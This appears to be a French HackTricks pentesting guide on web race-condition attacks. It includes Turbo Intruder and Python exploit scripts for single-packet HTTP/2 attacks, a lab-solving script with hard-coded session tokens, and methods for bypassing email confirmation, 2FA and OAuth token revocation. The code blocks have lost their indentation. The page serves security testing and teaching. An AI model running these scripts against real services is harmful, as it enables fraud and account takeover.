# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> Pour obtenir une compréhension approfondie de cette technique, consultez le rapport original sur [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Améliorer les attaques Race Condition

Le principal obstacle pour exploiter les race conditions est de s'assurer que plusieurs requêtes soient traitées en même temps, avec une différence de leurs temps de traitement très faible — idéalement, moins de 1 ms.

Voici quelques techniques pour synchroniser des requêtes :

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2** : Permet d'envoyer deux requêtes sur une seule connexion TCP, réduisant l'impact du jitter réseau. Cependant, en raison des variations côté serveur, deux requêtes peuvent ne pas suffire pour un exploit de race condition fiable.
- **HTTP/1.1 'Last-Byte Sync'** : Permet de pré-envoyer la majeure partie de 20-30 requêtes, en retenant un petit fragment, qui est ensuite envoyé ensemble, obtenant ainsi une arrivée simultanée au serveur.

**Préparation pour Last-Byte Sync** implique :

1. Envoyer les en-têtes et les données du corps moins l'octet final sans fermer le flux.
2. Faire une pause de 100 ms après l'envoi initial.
3. Désactiver TCP_NODELAY pour utiliser Nagle's algorithm afin de regrouper les frames finaux.
4. Envoyer des pings pour préchauffer la connexion.

L'envoi ultérieur des frames retenues devrait aboutir à leur arrivée dans un seul paquet, vérifiable via Wireshark. Cette méthode ne s'applique pas aux fichiers statiques, qui ne sont généralement pas impliqués dans les attaques RC.

### S'adapter à l'architecture du serveur

Comprendre l'architecture cible est crucial. Les serveurs frontaux peuvent router les requêtes différemment, ce qui affecte le timing. Le préchauffage côté serveur, via des requêtes sans conséquence, peut normaliser le timing des requêtes.

#### Gérer le verrouillage basé sur la session

Des frameworks comme le session handler de PHP sérialisent les requêtes par session, ce qui peut masquer des vulnérabilités. Utiliser différents tokens de session pour chaque requête peut contourner ce problème.

#### Surmonter les limites de débit ou de ressources

Si le préchauffage de la connexion est inefficace, provoquer intentionnellement des délais liés aux limites de débit ou de ressources des serveurs web via un flood de requêtes factices peut faciliter le single-packet attack en induisant un délai côté serveur propice aux race conditions.

## Attack Examples

- **Tubo Intruder - HTTP2 single-packet attack (1 endpoint)**: Vous pouvez envoyer la requête vers **Turbo intruder** (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), vous pouvez modifier dans la requête la valeur que vous voulez bruteforcer pour **`%s`** comme dans `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` et ensuite sélectionner le **`examples/race-single-packer-attack.py`** dans la liste déroulante :

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

Si vous allez **envoyer différentes valeurs**, vous pouvez modifier le code avec celui-ci qui utilise une wordlist depuis le presse-papiers:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> Si le site ne prend pas en charge HTTP2 (seulement HTTP1.1), utilisez `Engine.THREADED` ou `Engine.BURP` au lieu de `Engine.BURP2`.

- **Tubo Intruder - HTTP2 single-packet attack (Several endpoints)**: Dans le cas où vous devez envoyer une requête à 1 endpoint puis plusieurs à d'autres endpoints pour déclencher la RCE, vous pouvez modifier le script `race-single-packet-attack.py` avec quelque chose comme:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- Il est également disponible dans **Repeater** via la nouvelle option '**Send group in parallel**' dans Burp Suite.
- Pour **limit-overrun** vous pouvez simplement ajouter la **même requête 50 fois** dans le groupe.
- Pour **connection warming**, vous pouvez **ajouter** au **début** du **groupe** quelques **requêtes** vers une partie non statique du serveur web.
- Pour **retarder** le processus **entre** le traitement **d'une requête et d'une autre** en 2 étapes de sous-états, vous pouvez **ajouter des requêtes supplémentaires entre** les deux requêtes.
- Pour un RC **multi-endpoint** vous pouvez commencer par envoyer la **requête** qui **va vers l'état caché** et ensuite **50 requêtes** juste après qui **exploitent l'état caché**.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: Le but de ce script est de changer l'email d'un utilisateur tout en vérifiant en continu jusqu'à ce que le verification token du nouvel email arrive dans l'ancien email (c'est parce que dans le code on observait un RC où il était possible de modifier un email mais que la vérification soit envoyée à l'ancien, car la variable indiquant l'email était déjà initialisée avec la première valeur).\
Quand le mot "objetivo" est trouvé dans les emails reçus, nous savons que nous avons reçu le verification token de l'email modifié et nous terminons l'attaque.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
### Amélioration du Single Packet Attack

Dans la recherche originale, il est expliqué que cette attaque a une limite de 1 500 octets. Cependant, dans [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), il est expliqué comment il est possible d'étendre la limitation de 1 500 octets de l'attaque Single Packet Attack à **la limitation de fenêtre de 65,535 B de TCP en utilisant la fragmentation au niveau IP** (en scindant un seul paquet en plusieurs paquets IP) et en les envoyant dans un ordre différent, ce qui empêche le réassemblage du paquet jusqu'à ce que tous les fragments aient atteint le serveur. Cette technique a permis au chercheur d'envoyer 10 000 requêtes en environ 166 ms.

Notez que bien que cette amélioration rende l'attaque plus fiable pour des RC qui nécessitent que des centaines/milliers de paquets arrivent en même temps, elle peut aussi rencontrer des limitations logicielles. Certains serveurs HTTP populaires comme Apache, Nginx et Go ont un réglage strict `SETTINGS_MAX_CONCURRENT_STREAMS` fixé respectivement à 100, 128 et 250. Cependant, d'autres comme NodeJS et nghttp2 l'ont illimité.\
Cela signifie essentiellement qu'Apache ne considérera que 100 connexions HTTP à partir d'une seule connexion TCP (limitant cette attaque RC).

Vous pouvez trouver quelques exemples utilisant cette technique dans le repo [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Avant les recherches précédentes, voici quelques payloads utilisés qui essayaient simplement d'envoyer les paquets aussi rapidement que possible pour provoquer un RC.

- **Repeater:** Check the examples from the previous section.
- **Intruder**: Envoyez la **requête** à **Intruder**, définissez le **nombre de threads** sur **30** dans le **menu Options**, sélectionnez comme payload **Null payloads** et générez **30.**
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **Méthodologie RC**

### Dépassement de limite / TOCTOU

C'est le type le plus basique de race condition où des **vulnérabilités** apparaissent dans des endroits qui **limitent le nombre de fois où vous pouvez effectuer une action**. Par exemple utiliser le même code de réduction plusieurs fois dans une boutique en ligne. Un exemple très simple se trouve dans [**ce rapport**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) ou dans [**ce bug**](https://hackerone.com/reports/759247)**.**

Il existe de nombreuses variantes de ce type d'attaque, notamment :

- Utiliser une carte cadeau plusieurs fois
- Noter un produit plusieurs fois
- Retirer ou transférer de l'argent en excès du solde de votre compte
- Réutiliser une seule solution CAPTCHA
- Contourner une limitation de taux anti-brute-force

### **Sous-états cachés**

L'exploitation de race conditions complexes implique souvent de profiter de brèves opportunités pour interagir avec des sous-états machine cachés ou **non intentionnels**. Voici comment aborder cela :

1. **Identifier les sous-états cachés potentiels**
- Commencez par repérer les endpoints qui modifient ou interagissent avec des données critiques, comme les profils utilisateur ou les processus de password reset. Concentrez-vous sur :
- **Storage** : Préférez les endpoints qui manipulent des données persistantes côté serveur plutôt que ceux qui gèrent des données côté client.
- **Action** : Recherchez des opérations qui modifient des données existantes, plus susceptibles de créer des conditions exploitables que celles qui ajoutent de nouvelles données.
- **Keying** : Les attaques réussies impliquent généralement des opérations indexées sur le même identifiant, par ex. username ou reset token.
2. **Effectuer des tests initiaux**
- Testez les endpoints identifiés avec des attaques de race condition, en observant tout écart par rapport aux résultats attendus. Des réponses inattendues ou des changements dans le comportement de l'application peuvent signaler une vulnérabilité.
3. **Démontrer la vulnérabilité**
- Réduisez l'attaque au nombre minimal de requêtes nécessaire pour l'exploiter, souvent seulement deux. Cette étape peut nécessiter plusieurs tentatives ou de l'automatisation en raison du timing précis requis.

### Attaques sensibles au temps

La précision dans le timing des requêtes peut révéler des vulnérabilités, surtout lorsque des méthodes prévisibles comme des timestamps sont utilisées pour des security tokens. Par exemple, la génération de password reset tokens basée sur des timestamps pourrait produire des tokens identiques pour des requêtes simultanées.

**Pour exploiter :**

- Utilisez un timing précis, comme une attaque par paquet unique, pour effectuer des requêtes de password reset concurrentes. Des tokens identiques indiquent une vulnérabilité.

**Exemple :**

- Demandez deux password reset tokens en même temps et comparez-les. Des tokens identiques suggèrent une faiblesse dans la génération des tokens.

**Consultez** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **pour essayer ceci.**

## Études de cas sur les sous-états cachés

### Payer & ajouter un article

Consultez [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) pour voir comment **payer** dans une boutique et **ajouter un article supplémentaire** que vous **n'aurez pas besoin de payer**.

### Confirmer d'autres adresses e-mail

L'idée est de **vérifier une adresse e-mail et de la remplacer simultanément par une autre** pour vérifier si la plateforme confirme la nouvelle adresse.

### Changer l'email en 2 adresses e-mail (basé sur Cookie)

Selon [**this research**](https://portswigger.net/research/smashing-the-state-machine) Gitlab était vulnérable à une prise de contrôle de cette façon parce qu'il pouvait **envoyer** le **token de vérification d'une adresse e-mail à une autre**.

**Consultez** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **pour essayer ceci.**

### États cachés de la base de données / Contournement de confirmation

Si **2 écritures différentes** sont utilisées pour **ajouter** **des informations** dans une **base de données**, il existe une courte période où **seules les premières données ont été écrites** dans la base. Par exemple, lors de la création d'un utilisateur le **nom d'utilisateur** et le **mot de passe** peuvent être **écrits**, puis **le token** pour confirmer le compte nouvellement créé est écrit. Cela signifie que pendant un court instant le **token pour confirmer un compte est null**.

Par conséquent, **s'enregistrer et envoyer plusieurs requêtes avec un token vide** (`token=` ou `token[]=` ou toute autre variation) pour confirmer le compte immédiatement pourrait permettre de **confirmer un compte** dont vous ne contrôlez pas l'e-mail.

**Consultez** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **pour essayer ceci.**

### Contourner le 2FA

Le pseudo-code suivant est vulnérable à une race condition parce que pendant un très court laps de temps la **2FA n'est pas appliquée** alors que la session est créée :
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 persistance éternelle

There are several [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Ces services vous permettent de créer une application et d'authentifier les utilisateurs que le provider a enregistrés. Pour ce faire, le **client** devra **autoriser votre application** à accéder à une partie de leurs données chez le **OAUth provider**.\
Donc, jusqu'ici c'est juste un login commun avec google/linkedin/github... où on vous affiche une page disant : "_Application \<InsertCoolName> veut accéder à vos informations, voulez-vous l'autoriser ?_"

#### Race Condition dans `authorization_code`

Le **problème** apparaît lorsque vous **l'acceptez** et qu'il envoie automatiquement un **`authorization_code`** à l'application malveillante. Ensuite, cette **application abuse d'une Race Condition dans le OAUth service provider pour générer plus d'un AT/RT** (_Authentication Token/Refresh Token_) à partir du **`authorization_code`** pour votre compte. En gros, elle exploite le fait que vous avez autorisé l'application à accéder à vos données pour **créer plusieurs comptes**. Ensuite, si vous **cessez d'autoriser l'application à accéder à vos données, une paire d'AT/RT sera supprimée, mais les autres resteront valides**.

#### Race Condition dans `Refresh Token`

Une fois que vous avez **obtenu un RT valide**, vous pouvez essayer de **l'abuser pour générer plusieurs AT/RT** et **même si l'utilisateur annule les permissions** pour l'application malveillante d'accéder à ses données, **plusieurs RT resteront valides.**

## **RC in WebSockets**

- In [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) vous pouvez trouver un PoC en Java pour envoyer des messages websocket en **parallèle** afin d'abuser des **Race Conditions aussi dans les Web Sockets**.
- Avec Burp’s WebSocket Turbo Intruder vous pouvez utiliser le moteur **THREADED** pour lancer plusieurs connexions WS et envoyer des payloads en parallèle. Commencez par l'exemple officiel et ajustez `config()` (nombre de threads) pour la concurrence ; c'est souvent plus fiable que le batching sur une seule connexion lorsqu'on exploite une Race Condition sur l'état côté serveur via les handlers WS. Voir [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## References

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)

{{#include ../banners/hacktricks-training.md}}
